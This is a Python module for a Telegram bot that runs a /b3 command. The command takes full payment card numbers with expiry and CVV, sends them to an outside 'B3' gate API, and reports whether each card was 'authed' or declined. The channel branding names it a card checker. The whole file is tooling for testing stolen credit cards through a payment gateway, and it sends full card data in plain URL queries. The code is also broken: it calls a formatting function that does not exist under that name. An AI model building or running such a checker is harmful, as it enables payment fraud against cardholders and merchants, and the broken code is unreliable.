import urllib.request
import urllib.error
import json
import asyncio
import logging
import time
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import CommandHandler, ContextTypes

logging.basicConfig(format="%(asctime)s - %(levelname)s - %(message)s", level=logging.INFO)

B3_API_URL = "https://avs.blaze.indevs.in/api/b3"

def kb_b3():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("🦇 CARD X CHK", url="https://t.me/Batcardchk")],
        [InlineKeyboardButton("🗡️ DEV ➺ Batman", url="https://t.me/Batmancardchk")]
    ])

def format_b3_response(card: str, raw: dict, user, time_taken: float) -> str:
    try:
        message = raw.get("message", "")
        status = raw.get("status", "")
        
        # Check for APPROVED based on your exact API response
        if "Nice! New payment method added" in message or status == "processed":
            approved = True
        else:
            approved = False
            
    except Exception:
        approved = False

    u = user.username or user.first_name
    status_txt = "Cᴀʀᴅ Aᴜᴛʜᴇᴇᴅ ✅" if approved else "Cᴀʀᴅ Dᴇᴄʟɪɴᴇᴅ ❌"
    
    # Get gateway info
    gateway_txt = raw.get("gateway", "B3")
    
    return (
        f"Tᴏᴛᴀʟ Cᴀʀᴅꜱ ➺ 1/1\n"
        f"Tɪᴍᴇ ➺ {time_taken:.2f}s\n"
        f"Uꜱᴇʀ ➺ {u}\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"━━━━━━━━━━━━━━━━\n"
        f"<code>{card}</code>\n"
        f"{status_txt}\n"
        f"Gᴀᴛᴇᴡᴀʏ ➺ {gateway_txt}\n"
        f"Rᴇꜱᴘ ➺ {message}\n"
        f"━━━━━━━━━━━━━━━━\n\n"
        f"✅ Cʜᴇᴄᴋ Cᴏᴍᴘʟᴇᴛᴇ."
    )

async def check_b3(card: str) -> dict:
    """Send card to B3 API"""
    try:
        url = f"{B3_API_URL}?cc={card}"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        
        loop = asyncio.get_running_loop()
        def do_req():
            with urllib.request.urlopen(req, timeout=120) as response:
                return json.loads(response.read().decode('utf-8'))
                
        return await loop.run_in_executor(None, do_req)
        
    except urllib.error.HTTPError as e:
        return {"error": f"HTTP {e.code}"}
    except Exception as e:
        return {"error": str(e)}

async def cmd_b3(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /b3 command"""
    user = update.effective_user
    card = ""
    
    # Check if replied to a message (grab card from replied text)
    if update.message.reply_to_message and update.message.reply_to_message.text:
        card = update.message.reply_to_message.text.strip()
    # Check if passed in arguments
    elif context.args:
        card = " ".join(context.args).strip()
    
    # Clean card format (allow spaces or |)
    card = card.replace(" ", "|")
    
    if not card or "|" not in card or len(card.split("|")) != 4:
        await update.message.reply_text(
            "❌ INVALID FORMAT\n\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "REPLY TO A MESSAGE WITH CARDS\n"
            "OR SEND: /b3 cc|mm|yy|cvv\n"
            "━━━━━━━━━━━━━━━━━━",
            parse_mode="HTML"
        )
        return

    # Send processing message
    status_msg = await update.message.reply_text(
        f"⏳ Checking B3 Gate...\n\n"
        f"Card: <code>{card.split('|')[0]}...{card.split('|')[-1]}</code>",
        parse_mode="HTML"
    )
    
    # Start timer
    start_time = time.time()
    
    # Call API
    result = await check_b3(card)
    time_taken = time.time() - start_time
    
    if "error" in result:
        try:
            await status_msg.edit_text(
                f"❌ B3 GATE ERROR\n\n"
                f"Error: {result['error']}\n"
                f"━━━━━━━━━━━━━━━━━━",
                parse_mode="HTML"
            )
        except: pass
        return
        
    # Format and send final result
    response_text = format_b3(card, result, user, time_taken)
    
    try:
        await status_msg.edit_text(
            text=response_text,
            parse_mode="HTML",
            reply_markup=kb_b3(),
            disable_web_page_preview=True
        )
    except Exception:
        try:
            await status_msg.delete()
            await update.message.reply_text(
                text=response_text,
                parse_mode="HTML",
                reply_markup=kb_b3(),
                disable_web_page_preview=True
            )
        except: pass

def get_b3_handler():
    """Return the b3 command handler for main.py"""
    return CommandHandler("b3", cmd_b3)
